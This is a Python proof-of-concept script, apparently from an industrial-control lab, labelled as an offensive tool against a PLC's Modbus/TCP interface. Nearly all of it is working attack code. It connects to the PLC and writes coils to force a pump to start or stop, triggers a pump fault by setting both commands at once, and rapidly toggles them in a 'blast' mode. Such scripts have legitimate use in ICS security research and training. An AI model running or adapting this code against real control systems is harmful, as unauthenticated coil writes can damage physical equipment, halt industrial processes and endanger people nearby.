#!/usr/bin/env python3
"""attacker/attack_modbus.py
Simple offensive PoC script to interact with the PLC Modbus/TCP interface.
Modes:
 - fault : set START and STOP simultaneously to trigger pump_fault
 - start : write coil 0 = 1 (pump_start)
 - stop  : write coil 1 = 1 (pump_stop)
 - blast : repeatedly toggle start/stop to exercise behavior

Usage:
  python3 attacker/attack_modbus.py --host 10.0.3.10 --mode fault

Requirements: pymodbus>=3.6
"""
from __future__ import annotations

import argparse
import logging
import time
from typing import Tuple

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient
LOGGER = logging.getLogger('attacker')


def connect(host: str, port: int = 502, timeout: float = 3.0) -> ModbusTcpClient:
    client = ModbusTcpClient(host, port=port, timeout=timeout)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f'Cannot connect to Modbus server at {host}:{port}')
    return client


def write_coil(client: ModbusTcpClient, addr: int, value: bool) -> None:
    rr = client.write_coil(addr, int(value))
    if rr.isError():
        raise RuntimeError(f'Failed to write coil {addr}')


def do_fault(client: ModbusTcpClient) -> None:
    LOGGER.info('Triggering FAULT: setting START and STOP simultaneously')
    # set both coils; some PLCs evaluate sequentially, but this PoC emulates fault when both set
    write_coil(client, 0, True)
    write_coil(client, 1, True)
    time.sleep(0.5)
    coils = client.read_coils(0, 4)
    LOGGER.info('Coils after fault attempt: %s', coils.bits if coils and not coils.isError() else 'read-failed')
    # cleanup
    write_coil(client, 0, False)
    write_coil(client, 1, False)


def do_start_stop_blast(client: ModbusTcpClient, cycles: int, delay: float) -> None:
    LOGGER.info('Starting blast: %d cycles, %fs delay', cycles, delay)
    for i in range(cycles):
        write_coil(client, 0, True)
        time.sleep(delay)
        write_coil(client, 0, False)
        time.sleep(delay)
        write_coil(client, 1, True)
        time.sleep(delay)
        write_coil(client, 1, False)
    LOGGER.info('Blast complete')


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='10.0.3.10', help='PLC IP address')
    parser.add_argument('--port', type=int, default=502, help='Modbus/TCP port')
    parser.add_argument('--mode', choices=['fault', 'start', 'stop', 'blast'], default='fault')
    parser.add_argument('--cycles', type=int, default=5, help='cycles for blast')
    parser.add_argument('--delay', type=float, default=0.5, help='delay between operations for blast')
    args = parser.parse_args()

    try:
        client = connect(args.host, args.port)
    except Exception as e:
        LOGGER.error('%s', e)
        return 2

    try:
        if args.mode == 'fault':
            do_fault(client)
        elif args.mode == 'start':
            write_coil(client, 0, True)
            LOGGER.info('Wrote START')
        elif args.mode == 'stop':
            write_coil(client, 1, True)
            LOGGER.info('Wrote STOP')
        elif args.mode == 'blast':
            do_start_stop_blast(client, args.cycles, args.delay)
        return 0
    finally:
        client.close()


if __name__ == '__main__':
    raise SystemExit(main())
